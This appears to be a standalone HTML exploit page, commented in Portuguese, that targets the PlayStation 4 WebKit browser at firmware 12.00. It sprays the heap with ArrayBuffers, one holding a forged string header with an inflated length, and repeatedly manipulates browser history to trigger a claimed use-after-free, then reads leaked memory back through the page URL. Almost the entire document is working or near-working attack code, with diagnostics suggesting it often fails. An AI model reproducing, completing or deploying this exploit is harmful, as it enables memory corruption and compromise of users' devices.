<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 12.00 - TROJAN V7 (GHOST BUSTER)</title>
<style>
    body { background-color: #000; color: #00ff00; font-family: monospace; padding: 20px; }
    button { 
        padding: 20px; width: 100%; margin-bottom: 10px;
        font-weight: bold; font-size: 16px; cursor: pointer; 
        border: 2px solid #0f0; background: #003300; color: #fff;
    }
    button:disabled { background: #333; border: 2px solid #555; color: #888; cursor: not-allowed; }
    #log { border: 1px solid #333; margin-top: 20px; padding: 10px; white-space: pre-wrap; height: 350px; overflow-y: scroll;}
    .error { color: #f00; font-weight: bold; border: 1px solid #f00; padding: 10px; margin-bottom: 10px; background: #200; }
    .pwned { background-color: #fff; color: #000; font-size: 1.5em; font-weight: bold; border: 5px solid #0f0; padding: 10px; }
</style>
</head>
<body onload="checkGhosts()">
<h2>PS4 WebKit - Trojan V7 (Anti-Ghost)</h2>
<div id="ghost-warning"></div>
<div id="status">Verificando ambiente...</div>
<button id="btn" onclick="runTrojan()" disabled>AGUARDANDO CHECAGEM...</button>
<div id="log"></div>

<script>
const logEl = document.getElementById("log");
const statusEl = document.getElementById("status");
const btn = document.getElementById("btn");
const ghostDiv = document.getElementById("ghost-warning");

function log(m) { 
    const d = document.createElement("div");
    d.textContent = `[${new Date().toLocaleTimeString().split(' ')[0]}] ${m}`;
    logEl.appendChild(d);
    logEl.scrollTop = logEl.scrollHeight;
}

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

// === PASSO 0: DETECTOR DE FANTASMAS ===
function checkGhosts() {
    let url = document.URL;
    if (url.indexOf("CCCC") !== -1 || url.indexOf("AAAA") !== -1) {
        ghostDiv.innerHTML = "<div class='error'>⛔ ERRO CRÍTICO: LIXO DE HISTÓRICO DETECTADO!<br>O navegador carregou uma URL antiga com 'CCCC'.<br>SOLUÇÃO: Aperte Options -> Excluir Histórico -> Recarregue com ?v=2</div>";
        statusEl.innerText = "BLOQUEADO: Limpe o histórico.";
        log("Abortado: URL já contém lixo antes do início.");
    } else {
        btn.disabled = false;
        btn.innerText = "INICIAR EXPLOIT (LIMPO)";
        statusEl.innerText = "Ambiente Limpo. Alvo: Bucket 64 -> Fake String";
    }
}

var keepAlive = [];

// === PAYLOAD: FAKE STRING ===
// O Bucket 64 funcionou com CCCC. Agora injetamos o HEADER FAKE.
function createTrojanObject(size, marker) {
    try {
        let buf = new ArrayBuffer(size);
        let view = new Uint32Array(buf);
        
        if (size === 64) {
            // FAKE HEADER (A Chave do Jailbreak)
            view[0] = 0x00000016; // Flags
            view[1] = 0x00020000; // LENGTH: 128.000 (Isso vaza a memória)
            view[2] = 0x41414141; // Lixo
            view[3] = 0x41414141; // Lixo
            // Resto preenchido com 'T' (Trojan)
            for(let i=4; i<view.length; i++) view[i] = 0x54545454;
        } else {
            for(let i=0; i<view.length; i++) view[i] = marker;
        }
        return buf;
    } catch(e) { return null; }
}

async function runTrojan() {
    logEl.innerHTML = "";
    keepAlive = [];
    statusEl.innerText = "Rodando...";

    // ESTRUTURA SHOTGUN (A que funcionou)
    const BUCKETS = [
        { size: 80,  marker: 0x41414141 }, 
        { size: 96,  marker: 0x42424242 }, 
        { size: 64,  marker: 0x45454545 }, // ALVO (Trojan)
        { size: 128, marker: 0x44444444 }  
    ];

    log("1. Preparando Heap...");
    for(let b of BUCKETS) {
        for(let k=0; k<100; k++) keepAlive.push(createTrojanObject(b.size, b.marker));
    }
    
    keepAlive = keepAlive.filter((_, i) => i % 4 !== 0);

    // LOOP 48 (O Gatilho Correto)
    log("2. Disparando UAF (Loop 48)...");
    
    let size = 977;
    const STEP = 14461;

    for(let i = 0; i < 48; i++) {
        let frag = "V".repeat(size); 
        history.pushState({}, "", "#" + frag);
        history.replaceState({}, "", "#" + frag.slice(0, frag.length >> 1));
        
        if(i % 6 === 0) setTimeout(() => history.back(), 0);
        
        if (i === 47) {
            log(">>> INJETANDO TROJAN NO BUCKET 64 <<<");
            
            setTimeout(() => history.back(), 0);
            
            // Spray Final
            for(let k=0; k<300; k++) {
                for(let b of BUCKETS) {
                    keepAlive.push(createTrojanObject(b.size, b.marker));
                }
            }
            
            setTimeout(() => { 
                 for(let i=0; i<4; i++) new ArrayBuffer(8*1024*1024);
            }, 20); 
        } else {
            size += STEP;
            await sleep(5);
        }
    }
    
    await sleep(500);
    checkResult();
}

function checkResult() {
    statusEl.innerText = "Verificando...";
    let url = document.URL;
    
    // SUCESSO REAL
    if (url.length > 2000 && url.indexOf("VVVV") === -1) {
        log("!!! GOD MODE ATIVADO !!!");
        log(`Tamanho: ${url.length}`);
        let dump = "";
        for(let i=1000; i<1030; i++) dump += url.charCodeAt(i).toString(16).padStart(2,'0') + " ";
        log(`LEAK: ${dump}`);
        statusEl.innerText = "PWNED: MEMORY LEAK";
        statusEl.className = "pwned";
        return;
    }

    // DIAGNÓSTICO
    if (url.indexOf("TTTT") !== -1 || url.indexOf("54545454") !== -1) {
        log("Sinal: 'TTTT' encontrado.");
        log("Objeto entrou, mas o fake header falhou. Quase lá.");
    } else if (url.indexOf("CCCC") !== -1) {
        log("ERRO: O navegador recarregou o cache antigo do meio do processo.");
    } else {
        log("Falha: 'V' persistente. Tente novamente.");
    }
}
</script>
</body>
</html>
